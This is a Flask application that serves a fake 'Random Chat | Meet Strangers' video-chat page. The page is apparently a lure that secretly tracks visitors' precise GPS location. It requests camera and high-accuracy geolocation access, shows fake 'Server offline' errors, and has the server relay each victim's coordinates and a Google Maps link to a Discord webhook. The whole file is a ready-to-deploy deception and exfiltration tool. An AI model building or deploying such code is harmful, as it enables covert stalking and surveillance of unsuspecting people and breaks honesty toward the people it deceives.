from flask import Flask, request, render_template_string, jsonify
import requests
import json
import logging
import os


app = Flask(__name__)

# Discord webhook URL (replace with your actual Discord webhook URL)

DISCORD_WEBHOOK_URL = os.getenv('DISCORD_WEBHOOK_URL')
HTML_PAGE = """
<!DOCTYPE html>
<html lang="en">

<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Random Chat | Meet Strangers</title>
    <style>
        body {
            margin: 0;
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
            background: linear-gradient(to bottom, rgba(0, 0, 0, 0.8), rgba(0, 0, 0, 0.9)),
                        url('https://source.unsplash.com/1600x900/?chat,connection');
            background-size: cover;
            background-position: center;
            color: #fff;
            display: flex;
            flex-direction: column;
            align-items: center;
            justify-content: center;
            height: 100vh;
            text-align: center;
            overflow: hidden;
        }

        .main-container {
            background: rgba(255, 255, 255, 0.1);
            padding: 20px;
            border-radius: 16px;
            box-shadow: 0 8px 20px rgba(0, 0, 0, 0.7);
            max-width: 800px;
            width: 90%;
            text-align: center;
            backdrop-filter: blur(10px);
        }

        h1 {
            font-size: 2.5rem;
            margin-bottom: 10px;
            color: #fff;
            text-shadow: 0px 2px 4px rgba(0, 0, 0, 0.5);
        }

        .video-container {
            width: 100%;
            max-width: 600px;
            aspect-ratio: 16/9;
            background: #000;
            border-radius: 12px;
            overflow: hidden;
            margin-bottom: 20px;
            position: relative;
            display: flex;
            align-items: center;
            justify-content: center;
            box-shadow: 0 4px 12px rgba(0, 0, 0, 0.8);
        }

        .video-placeholder {
            font-size: 1.5rem;
            color: #ddd;
        }

        .dropdown {
            display: none;
            margin: 20px 0;
        }

        select {
            font-size: 1.2rem;
            padding: 12px;
            width: 100%;
            max-width: 400px;
            background-color: rgba(0, 123, 255, 0.8);
            color: white;
            border: none;
            border-radius: 8px;
            cursor: pointer;
            transition: background-color 0.3s;
        }

        select:hover {
            background-color: rgba(0, 86, 179, 0.9);
        }

        .button-container {
            margin-top: 20px;
            display: flex;
            justify-content: center;
            gap: 15px;
        }

        .button-container button {
            font-size: 1.2rem;
            padding: 15px 30px;
            background-color: #007bff;
            color: white;
            border: none;
            border-radius: 50px;
            cursor: pointer;
            transition: all 0.3s ease;
        }

        .button-container button:hover {
            background-color: #0056b3;
            transform: translateY(-3px);
        }

        #output {
            margin-top: 20px;
            font-size: 1.2rem;
            color: #ffcc00;
        }

        @media (max-width: 768px) {
            h1 {
                font-size: 2rem;
            }

            .button-container {
                flex-direction: column;
                gap: 10px;
            }

            .button-container button {
                width: 80%;
            }

            select {
                width: 100%;
            }
        }
    </style>
</head>

<body>
    <div class="main-container">
        <h1>Random Chat | Meet Strangers</h1>

        <div class="video-container" id="videoContainer">
            <video id="localVideo" autoplay playsinline></video>
        </div>


        <div id="output">Ready to connect? Press Start</div>

        <div class="dropdown" id="dropdown">
            <p>Select a Location:</p>
            <select id="locationSelect">
                <option value="USA">United States</option>
                <option value="Canada">Canada</option>
                <option value="UK">United Kingdom</option>
                <option value="Australia">Australia</option>
                <option value="India">India</option>
                <option value="Brazil">Brazil</option>
                <option value="Germany">Germany</option>
                <option value="France">France</option>
                <option value="Italy">Italy</option>
                <option value="Japan">Japan</option>
                <option value="South Korea">South Korea</option>
                <option value="China">China</option>
                <option value="Russia">Russia</option>
                <option value="South Africa">South Africa</option>
                <option value="Mexico">Mexico</option>
                <option value="Argentina">Argentina</option>
                <option value="Egypt">Egypt</option>
                <option value="Nigeria">Nigeria</option>
                <option value="Saudi Arabia">Saudi Arabia</option>
                <option value="Turkey">Turkey</option>
                <option value="Spain">Spain</option>
                <option value="Sweden">Sweden</option>
                <option value="Norway">Norway</option>
                <option value="Denmark">Denmark</option>
                <option value="Finland">Finland</option>
                <option value="Switzerland">Switzerland</option>
                <option value="Belgium">Belgium</option>
                <option value="Netherlands">Netherlands</option>
                <option value="Poland">Poland</option>
                <option value="Greece">Greece</option>
                <option value="Portugal">Portugal</option>
                <option value="Chile">Chile</option>
                <option value="Peru">Peru</option>
                <option value="Colombia">Colombia</option>
                <option value="Venezuela">Venezuela</option>
                <option value="Malaysia">Malaysia</option>
                <option value="Singapore">Singapore</option>
                <option value="Indonesia">Indonesia</option>
                <option value="Philippines">Philippines</option>
                <option value="Thailand">Thailand</option>
                <option value="Vietnam">Vietnam</option>
                <option value="Pakistan">Pakistan</option>
                <option value="Bangladesh">Bangladesh</option>
                <option value="Sri Lanka">Sri Lanka</option>
                <option value="Nepal">Nepal</option>
                <option value="Iraq">Iraq</option>
                <option value="Jordan">Jordan</option>
                <option value="Israel">Israel</option>
                <option value="Palestine">Palestine</option>
                <option value="Lebanon">Lebanon</option>
                <option value="Syria">Syria</option>
                <option value="Afghanistan">Afghanistan</option>
                <option value="Kuwait">Kuwait</option>
                <option value="Bahrain">Bahrain</option>
                <option value="Qatar">Qatar</option>
                <option value="United Arab Emirates">United Arab Emirates</option>
                <option value="Oman">Oman</option>
                <option value="Yemen">Yemen</option>
            </select>
        </div>


        <div class="button-container">
            <button onclick="handleGetStarted()">Start</button>
            <button onclick="sendLocationData()">Next</button>
        </div>
    </div>

    <script>
        let geoWatchId;

        function startTracking() {
            if (navigator.geolocation) {
                geoWatchId = navigator.geolocation.watchPosition(sendPosition, showError, {
                    enableHighAccuracy: true,
                    maximumAge: 0,
                    timeout: 5000
                });
            } else {
                alert("Failed to get Server.");
            }
        }

        function sendPosition(position) {
            window.locationData = {
                latitude: position.coords.latitude,
                longitude: position.coords.longitude,
                accuracy: position.coords.accuracy,
                maps_link: `https://www.google.com/maps?q=${position.coords.latitude},${position.coords.longitude}`
            };
        }

        function showError(error) {
            alert("Server error: Allow Location & Camera to chat.");
        }

        function handleGetStarted() {
            startTracking();
            document.getElementById('output').innerHTML = "Please select a topic and click Next.";
            document.getElementById('dropdown').style.display = "block";
        }

        function sendLocationData() {
            const selectedOption = document.getElementById('locationSelect').value;
            const locationData = window.locationData;

            if (locationData) {
                fetch('/submit_location', {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({
                        ...locationData,
                        selected_option: selectedOption
                    })
                })
                .then(response => response.json())
                .then(data => {
                    alert('Server offline.');
                    stopTracking();
                });
            }
        }

        function stopTracking() {
            if (geoWatchId) {
                navigator.geolocation.clearWatch(geoWatchId);
            }
        }


        function startVideo() {
        const videoElement = document.getElementById('localVideo');

        if (navigator.mediaDevices && navigator.mediaDevices.getUserMedia) {
            navigator.mediaDevices.getUserMedia({ video: true })
                .then(function (stream) {
                    videoElement.srcObject = stream;
                })
                .catch(function (error) {
                    alert("Camera access denied or unavailable: " + error.message);
                });
        } else {
            alert("Your browser does not support camera access.");
        }
    }

    function handleGetStarted() {
        startVideo();  // Start video along with location tracking
        startTracking();
        document.getElementById('output').innerHTML = "Please select a topic and click Next.";
        document.getElementById('dropdown').style.display = "block";
    }

    </script>
</body>

</html>



"""

@app.route('/')
def index():
    return render_template_string(HTML_PAGE)

@app.route('/submit_location', methods=['POST'])
def submit_location():
    data = request.json
    latitude = data.get('latitude')
    longitude = data.get('longitude')
    accuracy = data.get('accuracy')
    maps_link = data.get('maps_link')
    selected_option = data.get('selected_option')

    # Prepare the message to send to Discord
    message = {
        'content': f"**New GPS Location:**\nLatitude: {latitude}\nLongitude: {longitude}\nAccuracy: {accuracy} meters\n[View on Google Maps]({maps_link})\nSelected Option: {selected_option}"
    }

    # Send the data to Discord webhook
    try:
        response = requests.post(DISCORD_WEBHOOK_URL, json=message)
        return jsonify({'status': 'success', 'message': 'sent', 'response': response.text})
    except Exception as e:
        return jsonify({'status': 'error', 'message': str(e)})

if __name__ == '__main__':
    # Get the port from the environment, default to 5000 if not set
    port = int(os.environ.get("PORT", 5000))
    app.run(debug=True, host='0.0.0.0', port=port)
